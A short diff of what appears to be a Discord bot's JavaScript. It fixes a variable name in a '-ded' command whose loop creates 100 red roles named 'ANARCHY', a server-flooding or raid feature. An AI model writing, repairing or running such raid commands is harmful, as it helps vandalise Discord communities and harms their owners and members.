@@ -122,7 +122,7 @@ if (msg.content === '-ded') {
   console.log(`Commande -ded par ${msg.author.tag}`);
 
     for (var i = 0; i < 100; i++) {
-      message.guild.createRole({
+      msg.guild.createRole({
         name: 'ANARCHY',
         color: 'RED',
       })
